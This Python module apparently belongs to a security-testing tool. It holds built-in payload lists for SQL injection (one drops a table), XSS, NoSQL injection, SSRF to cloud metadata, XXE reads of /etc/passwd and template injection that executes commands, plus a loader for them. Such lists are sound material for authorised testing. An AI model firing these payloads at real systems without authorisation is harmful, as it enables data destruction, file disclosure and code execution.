"""
SAPT Payload Loader — Load attack payloads from data/ directory.
"""

from __future__ import annotations

from pathlib import Path
from typing import List, Optional


# ── Builtin payloads (used when no file-based payloads exist) ────────────────

BUILTIN_PAYLOADS = {
    "sqli": [
        "'", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR 1=1--",
        "' UNION SELECT NULL--", "'; DROP TABLE users--",
        "1' AND SLEEP(3)--", "admin' --",
    ],
    "xss": [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "' onmouseover='alert(1)'",
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        'javascript:alert(1)',
        '{{7*7}}',
    ],
    "nosqli": [
        '{"$gt": ""}', '{"$ne": ""}',
        '{"$regex": ".*"}', '{"$where": "1==1"}',
        "[$gt]=&", "[$ne]=",
    ],
    "ssrf": [
        "http://127.0.0.1", "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]", "file:///etc/passwd",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>',
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>",
        "{{config}}", "{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
    "idor": [
        "1", "2", "0", "-1", "999999",
        "admin", "test", "null", "undefined",
    ],
}


def load_payloads(
    payload_type: str,
    custom_file: Optional[str] = None,
    data_dir: Optional[str] = None,
) -> List[str]:
    """
    Load payloads by type. Priority:
    1. Custom file (if provided)
    2. data/payloads/{type}/ directory
    3. Built-in payloads
    """
    # 1. Custom file
    if custom_file:
        path = Path(custom_file)
        if path.exists():
            return _read_payload_file(path)

    # 2. Data directory
    if data_dir:
        data_path = Path(data_dir) / "payloads" / payload_type
        if data_path.exists():
            payloads = []
            for file in sorted(data_path.glob("*.txt")):
                payloads.extend(_read_payload_file(file))
            if payloads:
                return payloads

    # 3. Built-in
    return BUILTIN_PAYLOADS.get(payload_type, [])


def _read_payload_file(path: Path) -> List[str]:
    """Read payloads from a file, one per line."""
    return [
        line.strip()
        for line in path.read_text(encoding="utf-8", errors="replace").splitlines()
        if line.strip() and not line.startswith("#")
    ]
